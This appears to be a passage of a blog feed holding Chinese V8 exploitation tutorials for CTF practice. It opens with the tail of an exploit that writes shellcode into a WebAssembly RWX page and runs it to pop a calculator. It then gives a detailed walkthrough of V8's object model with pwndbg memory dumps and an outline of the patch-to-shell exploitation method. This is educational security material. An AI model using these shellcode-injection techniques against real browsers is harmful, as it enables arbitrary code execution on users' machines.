class="number">0x3ac0c748</span>;</span><br><span class="line">sc[<span class="number">12</span>] = <span class="number">0x50000030</span>;</span><br><span class="line">sc[<span class="number">13</span>] = <span class="number">0x4944b848</span>;</span><br><span class="line">sc[<span class="number">14</span>] = <span class="number">0x414c5053</span>;</span><br><span class="line">sc[<span class="number">15</span>] = <span class="number">0x48503d59</span>;</span><br><span class="line">sc[<span class="number">16</span>] = <span class="number">0x3148e289</span>;</span><br><span class="line">sc[<span class="number">17</span>] = <span class="number">0x485250c0</span>;</span><br><span class="line">sc[<span class="number">18</span>] = <span class="number">0xc748e289</span>;</span><br><span class="line">sc[<span class="number">19</span>] = <span class="number">0x00003bc0</span>;</span><br><span class="line">sc[<span class="number">20</span>] = <span class="number">0x050f00</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc.<span class="property">length</span>; i++) &#123;</span><br><span class="line"><span class="title function_">set_32</span>(rwx_addr + i * <span class="number">4</span>, sc[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">f</span>();<span class="comment">//最后调用一下wasm实例化的main函数，来触发shellcode</span></span><br></pre></td></tr></table></figure></div><p>可以看到弹计算器成功了</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241115181021063.png"                      alt="image-20241115181021063"                ><figcaption>image-20241115181021063</figcaption></figure></p><blockquote><p>m系列mac上用UTM运行的x86虚拟机UI界面实在太卡了，ssh连接更方便点</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js-engine </tag>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V8-pwn入门(1)——对象模型、特性</title>
      <link href="/2024/11/12/V8-pwn%E5%85%A5%E9%97%A8-1-%E2%80%94%E2%80%94%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E3%80%81%E7%89%B9%E6%80%A7/"/>
      <url>/2024/11/12/V8-pwn%E5%85%A5%E9%97%A8-1-%E2%80%94%E2%80%94%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E3%80%81%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言💬"><a href="#0x00-前言💬" class="headerlink" title="0x00 前言💬"></a>0x00 前言💬</h2><p>下面说的都是chrome80以前的v8，无sandbox、指针压缩</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241115181353869.png"                      alt="image-20241115181353869"                ><figcaption>image-20241115181353869</figcaption></figure></p><h2 id="0x01-基础🪨"><a href="#0x01-基础🪨" class="headerlink" title="0x01 基础🪨"></a>0x01 基础🪨</h2><h3 id="JS-Engine-CTF的常见模式"><a href="#JS-Engine-CTF的常见模式" class="headerlink" title="JS Engine CTF的常见模式"></a>JS Engine CTF的常见模式</h3><ol><li><p>由出题⼈⾃⼰编写的patch引⼊的漏洞</p></li><li><p>历史漏洞的CVE被出题⼈重新引⼊</p></li></ol><h4 id="攻略方法"><a href="#攻略方法" class="headerlink" title="攻略方法"></a>攻略方法</h4><ol><li><p>创建⼀个⽤于调试的js环境，如果有出题⼈提供的引⼊漏洞的patch，那么打上这个patch</p></li><li><p>分析这个patch并判断这个patch引⼊的是js引擎的哪个阶段</p></li></ol><p>​a. Runtime(CSA or Torque), TurboFan, Ignition, AST, InlineCache, …</p><ol start="3"><li><p>构造poc去触发漏洞</p></li><li><p>利⽤漏洞去构造任意地址读写&#x2F;任意对象地址的泄露&#x2F;伪造任意对象等原语</p></li><li><p>getshell，常⽤的⽅法是利⽤v8⾥的rwx地址区域（wasm中就有）直接写⼊shellcode代码来实现任意代码执⾏</p></li></ol><h2 id="0x02-V8对象模型⚙️"><a href="#0x02-V8对象模型⚙️" class="headerlink" title="0x02 V8对象模型⚙️"></a>0x02 V8对象模型⚙️</h2><h3 id="objects-h"><a href="#objects-h" class="headerlink" title="objects.h"></a>objects.h</h3><p>v8源码中的objects.h里写了对象模型的结构，可以看出最大的是Object，Object总体上分为两类<code>Smi</code>和<code>HeapObject</code></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Most object types in the V8 JavaScript are described in this file.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Inheritance hierarchy:</span></span><br><span class="line"><span class="comment">// - Object</span></span><br><span class="line"><span class="comment">//   - Smi          (immediate small integer)</span></span><br><span class="line"><span class="comment">//   - HeapObject   (superclass for everything allocated in the heap)</span></span><br><span class="line"><span class="comment">//     - JSReceiver  (suitable for property access)</span></span><br><span class="line"><span class="comment">//       - JSObject</span></span><br><span class="line"><span class="comment">//         - JSArray</span></span><br><span class="line"><span class="comment">//         - JSArrayBuffer</span></span><br><span class="line"><span class="comment">//        .........</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Formats of Object::ptr_:</span></span><br><span class="line"><span class="comment">//  Smi:        [31 bit signed int] 0</span></span><br><span class="line"><span class="comment">//  HeapObject: [32 bit direct pointer] (4 byte aligned) | 01</span></span><br></pre></td></tr></table></figure></div><blockquote><p>凡是分配在v8堆上的，都会继承自<code>HeapObject</code>,<code>Smi</code>类似于cpu中的立即数</p></blockquote><p>v8中的各种类不是c++语法实现的，因此没有构造和析构函数，也没有任何的字段&#x2F;成员属性，是直接在<strong>v8 heap</strong>上通过<code>AllocateRaw</code>函数分配出来的内存</p><blockquote><p>再根据不同object的结构，对不同偏移的内存写入值，🧐这样的目的是为了通过v8 heap来管理内存、实现精准GC</p><p><a class="link"   href="https://fa1lr4in.com/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/" >《垃圾回收的算法与实现》v8篇 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h3 id="V8-Object分类"><a href="#V8-Object分类" class="headerlink" title="V8-Object分类"></a>V8-Object分类</h3><p>分为Smi和HeapObject</p><ul><li>smi表示有符号的31&#x2F;32位小整数</li><li>指向HeapObject的指针，由于内存对齐（8&#x2F;4字节）所以指针的最低位为0</li></ul><blockquote><p>这里为了更方便使用smi，意思是不另外用一个指针指向一块内存空间，里面再存smi，而且直接用32&#x2F;64bit表示，具体来说，HeapObject指针最低位肯定为0，但是由于smi的使用更频繁点，所以选择让smi左移一位让最低位变成0，而HeapObject指针则是把最低位置1，使用时再恢复。这种区分Smi和指向HeapObject的指针的方法叫<code>Tagged Values</code></p></blockquote><h4 id="Smi（小整数）"><a href="#Smi（小整数）" class="headerlink" title="Smi（小整数）"></a>Smi（小整数）</h4><ul><li>LSB始终为0</li><li>在32位上，smi右移1位可以获得原始值，64位要右移32位。smi表示的整数范围是有符号的31&#x2F;32位整数</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">  A[&quot;Signed Value (31 bit) ｜ 0&quot;] </span><br><span class="line">  C[&quot;Signed Value (32 bit) ｜ 0-Padding (31 bit) ｜ 0&quot;] </span><br></pre></td></tr></table></figure></div><h4 id="指向HeapObject的指针"><a href="#指向HeapObject的指针" class="headerlink" title="指向HeapObject的指针"></a>指向HeapObject的指针</h4><ul><li>LSB为1</li><li>下图为32&#x2F;64位示例</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">  A[&quot;Pointer (31 bit) ｜ 1&quot;] --&gt; B[&quot;HeapObject&quot;] </span><br><span class="line">  C[&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Pointer (63 bit)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;｜ 1&quot;]  --&gt; D[&quot;HeapObject&quot;] </span><br></pre></td></tr></table></figure></div><blockquote><p>🤓👆🏻使用<code>Tagged Value</code>区分smi和指向HeapObject的指针可以节省堆空间</p></blockquote><h2 id="0x03-关键的HeapObject🧐"><a href="#0x03-关键的HeapObject🧐" class="headerlink" title="0x03 关键的HeapObject🧐"></a>0x03 关键的HeapObject🧐</h2><h3 id="HeapNumber"><a href="#HeapNumber" class="headerlink" title="HeapNumber"></a>HeapNumber</h3><p>前面也提到smi只能表示有符号的31&#x2F;32位整数，超过这个范围的整数可以以double值的形式保存在HeapNumber里面,HeapNumber结构如下</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">  C[&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Pointer (63 bit)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;｜ 1&quot;]  --&gt; D[&quot;Map* | Value&quot;] </span><br></pre></td></tr></table></figure></div><blockquote><p>其中<code>Map*</code>表示整个<code>HeapObject</code>的类型,表示的整数就以double的形式存在<code>Value</code>中</p><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 存储了数字的堆对象</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HeapNumber</span> : <span class="keyword">public</span> HeapObject &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 返回存储的 double 类型的值</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">double</span> <span class="title">value</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">READ_DOUBLE_FIELD</span>(<span class="keyword">this</span>, kValueOffset);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 写入 double 值到对象</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">set_value</span><span class="params">(<span class="type">double</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">WRITE_DOUBLE_FIELD</span>(<span class="keyword">this</span>, kValueOffset, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将对象转换为 HeapNumber 指针</span></span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="keyword">inline</span> HeapNumber* <span class="title">cast</span><span class="params">(Object* obj)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 HeapNumber 转换为布尔值</span></span><br><span class="line">    <span class="function">Object* <span class="title">HeapNumberToBoolean</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 内存布局描述</span></span><br><span class="line">    <span class="comment">// kSize 之前的空间存储 map 对象的指针</span></span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> kValueOffset = HeapObject::kSize; <span class="comment">//偏移</span></span><br><span class="line">    <span class="comment">// kValueOffset 表示存储数字值的偏移量，类型为 double</span></span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> kSize = kValueOffset + kDoubleSize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// 禁止隐式构造函数</span></span><br><span class="line">    <span class="built_in">DISALLOW_IMPLICIT_CONSTRUCTORS</span>(HeapNumber);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div></blockquote><p>举个例子🌰</p><p>写一个object array，第一个元素是smi，第二个超过smi范围，第三个是字符串</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr =[<span class="number">0xdeadbee</span>,<span class="number">0xdeadbeef</span>,<span class="string">&quot;sloth&quot;</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(arr);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x02aaab84dda9</span> &lt;<span class="title class_">JSArray</span>[<span class="number">3</span>]&gt;</span><br></pre></td></tr></table></figure></div><p>gdb看一下这块内存(-1是因为tagged value),这里可能是版本问题，这个版本的v8把array又做了一层封装，封装到FixedArray中</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">4</span>gx <span class="number">0x02aaab84dda9</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x2aaab84dda8</span>:<span class="number">0x00000a0c4dc82f79</span>(Map*)<span class="number">0x00001179f91c0c71</span>(FixedArray)</span><br><span class="line"><span class="number">0x2aaab84ddb8</span>:<span class="number">0x000002aaab84dd09</span>(指向真实array的pointer)<span class="number">0x0000000300000000</span>(表示长度)</span><br></pre></td></tr></table></figure></div><p>继续访问真实的数组</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">8</span>gx <span class="number">0x000002aaab84dd09</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x2aaab84dd08</span>:<span class="number">0x00001179f91c0851</span>(Map*)<span class="number">0x0000000300000000</span>(数组长度)</span><br><span class="line"><span class="number">0x2aaab84dd18</span>:<span class="number">0x0deadbee00000000</span>(Smi)<span class="number">0x0000064aeec1f311</span>(HeapNumber Pointer)</span><br><span class="line"><span class="number">0x2aaab84dd28</span>:<span class="number">0x0000064aeec1f229</span>(<span class="string">&quot;sloth&quot;</span>)<span class="number">0x00001179f91c0851</span></span><br><span class="line"><span class="number">0x2aaab84dd38</span>:<span class="number">0x0000000400000000</span><span class="number">0x000013ab2a603b29</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x0000064aeec1f229</span></span><br><span class="line"><span class="meta">#sloth</span></span><br></pre></td></tr></table></figure></div><p>跟进HeapNumber</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">2</span>gx <span class="number">0x0000064aeec1f311</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x64aeec1f310</span>:<span class="number">0x00001179f91c0561</span><span class="number">0x41ebd5b7dde00000</span>(<span class="number">0xdeadbeef</span>的<span class="type">double</span>表示)</span><br><span class="line">pwndbg&gt; job <span class="number">0x41ebd5b7dde00000</span></span><br><span class="line">Smi: <span class="number">0x41ebd5b7</span> (<span class="number">1105974711</span>)</span><br></pre></td></tr></table></figure></div><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><p> 结构如下</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">  C[&quot;Pointer (63 bit)｜ 1&quot;]  --&gt; D[&quot;Map* | HashField｜Length｜String[0:8]｜String[8:16]&quot;] </span><br></pre></td></tr></table></figure></div><p>举个例子🌰</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr =[<span class="string">&quot;passion&quot;</span>,<span class="string">&quot;free&quot;</span>,<span class="string">&quot;sloth&quot;</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(arr);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x20c46b60dda1</span> &lt;<span class="title class_">JSArray</span>[<span class="number">3</span>]&gt;</span><br></pre></td></tr></table></figure></div><p>查看这块内存,跟进真正的array</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">4</span>gx <span class="number">0x20c46b60dda1</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x20c46b60dda0</span>:<span class="number">0x00001f8f0c182f79</span><span class="number">0x000028e799a40c71</span></span><br><span class="line"><span class="number">0x20c46b60ddb0</span>:<span class="number">0x000020c46b60dd01</span><span class="number">0x0000000300000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">6</span>gx <span class="number">0x000020c46b60dd01</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x20c46b60dd00</span>:<span class="number">0x000028e799a40851</span>(Map*)<span class="number">0x0000000300000000</span></span><br><span class="line"><span class="number">0x20c46b60dd10</span>:<span class="number">0x00001fa5bd15f229</span>(<span class="string">&quot;passion&quot;</span>)<span class="number">0x00001fa5bd15f241</span>(<span class="string">&quot;free&quot;</span>)</span><br><span class="line"><span class="number">0x20c46b60dd20</span>:<span class="number">0x00001fa5bd15f259</span>(<span class="string">&quot;sloth&quot;</span>)<span class="number">0x000028e799a40851</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x00001fa5bd15f229</span></span><br><span class="line"><span class="meta">#passion</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x00001fa5bd15f241</span></span><br><span class="line"><span class="meta">#free</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x00001fa5bd15f259</span></span><br><span class="line"><span class="meta">#sloth</span></span><br></pre></td></tr></table></figure></div><p>跟进第一个字符串passion</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x00001fa5bd15f229</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x1fa5bd15f228</span>:<span class="number">0x000028e799a40461</span>(map*)<span class="number">0x00000007a35b4466</span>(前四字节是length <span class="number">7</span>，后四字节是HashField)</span><br><span class="line"><span class="number">0x1fa5bd15f238</span>:<span class="number">0x006e6f6973736170</span>(<span class="string">&quot;passion&quot;</span>)<span class="number">0x000028e799a40461</span>(map*)</span><br><span class="line"><span class="number">0x1fa5bd15f248</span>:<span class="number">0x0000000401ff50c2</span>(length <span class="number">7</span> HashField)<span class="number">0x0000000065657266</span>(<span class="string">&quot;free&quot;</span>)</span><br><span class="line"><span class="number">0x1fa5bd15f258</span>:<span class="number">0x000028e799a40461</span>(map*)<span class="number">0x00000005a5bcda06</span>(length <span class="number">6</span> HashField)</span><br><span class="line"><span class="number">0x1fa5bd15f268</span>:<span class="number">0x00000068746f6c73</span>(<span class="string">&quot;sloth&quot;</span>)<span class="number">0x000028e799a40461</span></span><br><span class="line">pwndbg&gt; <span class="function">python <span class="title">print</span><span class="params">(bytes.fromhex(<span class="string">&quot;6e6f6973736170&quot;</span>).decode(<span class="string">&#x27;ascii&#x27;</span>))</span></span></span><br><span class="line"><span class="function">noissap</span></span><br><span class="line"><span class="function">pwndbg&gt; python <span class="title">print</span><span class="params">(bytes.fromhex(<span class="string">&quot;65657266&quot;</span>).decode(<span class="string">&#x27;ascii&#x27;</span>))</span></span></span><br><span class="line"><span class="function">eerf</span></span><br><span class="line"><span class="function">pwndbg&gt; python <span class="title">print</span><span class="params">(bytes.fromhex(<span class="string">&quot;68746f6c73&quot;</span>).decode(<span class="string">&#x27;ascii&#x27;</span>))</span></span></span><br><span class="line"><span class="function">htols</span></span><br></pre></td></tr></table></figure></div><blockquote><p>倒着存</p></blockquote><h3 id="JSObject"><a href="#JSObject" class="headerlink" title="JSObject"></a>JSObject</h3><ul><li>继承⾃Object，HeapObject，JSReceiver</li><li>Properties通过⼀个FixedArray(定⻓数组）保存所有的命名属性</li><li>Elements通过⼀个FixedArray保存所有的数字索引的属性</li></ul><p>结构如下</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">  C[&quot;Pointer (63 bit)｜ 1&quot;]  --&gt; D[&quot;Map* | Properties* ｜ Elements*&quot;] </span><br></pre></td></tr></table></figure></div><h3 id="JSArray"><a href="#JSArray" class="headerlink" title="JSArray"></a>JSArray</h3><p>继承Object, HeapObject, JSReceiver, JSObject，结构如下</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[&quot;Pointer (63 bit) | 1&quot;] --&gt; B[JSArray]</span><br><span class="line">    B --&gt; C[Map*]</span><br><span class="line">    B --&gt; D[Properties*]</span><br><span class="line">    B --&gt; E[Elements*]</span><br><span class="line">    B --&gt; F[Length]</span><br><span class="line">    E --&gt; G[FixedArray]</span><br><span class="line">    G --&gt; H[Map*]</span><br><span class="line">    G --&gt; I[Length]</span><br><span class="line">    G --&gt; J[&quot;Elements[0]&quot;]</span><br><span class="line">    G --&gt; K[&quot;Elements[1]&quot;]</span><br><span class="line">    G --&gt; M[&quot;....&quot;]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>JSArray中Elements的类型</p><ul><li><a class="link"   href="https://v8.dev/blog/elements-kinds" >https://v8.dev/blog/elements-kinds <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li>⼩整数，也称为 Smi</li><li>Double，⽤于不能表⽰为 Smi 的浮点数和整数。</li><li>常规元素，⽤于⽆法表⽰为Smi或double的值。</li></ul><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="comment">// elements kind: PACKED_SMI_ELEMENTS</span></span><br><span class="line">array.<span class="title function_">push</span>(<span class="number">4.56</span>);</span><br><span class="line"><span class="comment">// elements kind: PACKED_DOUBLE_ELEMENTS</span></span><br><span class="line">array.<span class="title function_">push</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="comment">// elements kind: PACKED_ELEMENTS</span></span><br><span class="line">array.<span class="property">length</span>; <span class="comment">// 5</span></span><br><span class="line">array[<span class="number">9</span>] = <span class="number">1</span>; <span class="comment">// array[5] until array[8] are now holes</span></span><br><span class="line"><span class="comment">//array[5] -- array[8] :elements kind: HOLEY_ELEMENTS</span></span><br></pre></td></tr></table></figure></div><p>举个例子🌰</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">1.1</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(arr);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x08e88570ddc9</span> &lt;<span class="title class_">JSArray</span>[<span class="number">2</span>]&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x08e88570ddc9</span></span><br><span class="line"><span class="number">0x8e88570ddc9</span>: [<span class="title class_">JSArray</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x2e172c042ed9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x0afb86dd1111</span> &lt;<span class="title class_">JSArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x08e88570dda9</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">2</span>]&gt; [<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">2</span></span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x17eb01180c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #<span class="attr">length</span>: <span class="number">0x07cfb6f401a9</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x08e88570dda9</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">2</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/4gx <span class="number">0x08e88570ddc9</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x8e88570ddc8</span>:<span class="number">0x00002e172c042ed9</span><span class="number">0x000017eb01180c71</span></span><br><span class="line"><span class="number">0x8e88570ddd8</span>:<span class="number">0x000008e88570dda9</span><span class="number">0x0000000200000000</span></span><br><span class="line">pwndbg&gt; x/10gx <span class="number">0x000008e88570dda9</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x8e88570dda8</span>:<span class="number">0x000017eb011814f9</span><span class="number">0x0000000200000000</span></span><br><span class="line"><span class="number">0x8e88570ddb8</span>:<span class="number">0x3ff0000000000000</span>(<span class="number">1</span>)<span class="number">0x3ff199999999999a</span>(<span class="number">1.1</span>的hex表示)</span><br><span class="line"><span class="number">0x8e88570ddc8</span>:<span class="number">0x00002e172c042ed9</span><span class="number">0x000017eb01180c71</span></span><br><span class="line"><span class="number">0x8e88570ddd8</span>:<span class="number">0x000008e88570dda9</span><span class="number">0x0000000200000000</span></span><br><span class="line"><span class="number">0x8e88570dde8</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x000008e88570dda9</span></span><br><span class="line"><span 